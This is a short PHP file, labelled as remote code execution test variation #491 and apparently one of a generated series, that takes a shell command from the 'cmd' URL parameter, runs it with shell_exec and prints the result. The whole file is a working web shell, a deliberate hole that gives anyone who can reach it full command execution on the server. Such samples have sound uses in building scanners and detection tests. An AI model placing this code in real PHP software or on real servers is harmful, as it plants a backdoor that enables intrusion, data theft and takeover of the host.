<?php
// RCE test variation #491
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>